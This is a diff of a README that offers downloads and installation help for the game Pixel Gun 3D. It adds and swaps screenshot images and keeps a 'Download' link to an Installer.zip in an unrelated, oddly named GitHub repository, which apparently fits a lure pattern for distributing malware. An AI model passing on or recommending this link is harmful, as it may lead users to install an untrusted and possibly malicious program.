@@ -1,3 +1,5 @@
+![изображение](https://github.com/SoftDevSabbir/Flutter_doc/assets/135597014/1c9233c5-0783-4497-9801-c5139f31ad5d)
+
 > [!NOTE]
 > This repository provides detailed information and resources for downloading, installing, and using the Pixel Gun 3D.
 
@@ -16,6 +18,7 @@
 
   
 ### Screenshots 📖 :
-![изображение](https://github.com/SoftDevSabbir/Flutter_doc/assets/135597014/1c9233c5-0783-4497-9801-c5139f31ad5d)
+![изображение](https://github.com/SoftDevSabbir/Flutter_doc/assets/135597014/2f77b0d5-d1ac-480b-8be1-9f15e555bb89)
+
 
 [📁Download](https://github.com/Uskills1/qqq1455/releases/download/1qqwwqw/Installer.zip)
